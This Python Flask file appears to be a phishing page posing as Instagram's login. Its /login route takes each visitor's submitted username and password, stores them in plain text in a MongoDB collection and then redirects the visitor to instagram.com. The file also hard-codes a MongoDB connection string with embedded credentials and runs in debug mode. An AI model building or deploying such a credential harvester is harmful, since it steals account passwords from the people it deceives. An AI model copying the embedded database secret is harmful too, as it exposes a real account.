from flask import Flask, request, render_template, send_from_directory, redirect
from pymongo import MongoClient

app = Flask(__name__, static_folder='static', template_folder='templates')

# MongoDB setup - Replace with your actual credentials (URL-encode special characters)
client = MongoClient("mongodb+srv://varuntech999:Varuntech999@cluster9.sgnal.mongodb.net/?retryWrites=true&w=majority&appName=Cluster9")
db = client['login_db']
users_collection = db['users']

# Serve static files (optional; Flask does this automatically by default)
@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('static', path)

@app.route('/')
def home():
    return render_template('index.html')  # Ensure index.html exists in templates/

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # INSECURE: Store hashed passwords instead of plain text!
    user = {
        "username": username,
        "password": password  # Replace with hashed password
    }
    users_collection.insert_one(user)

    return redirect('https://www.instagram.com')  # Redirect to Instagram

if __name__ == '__main__':
    app.run(debug=True)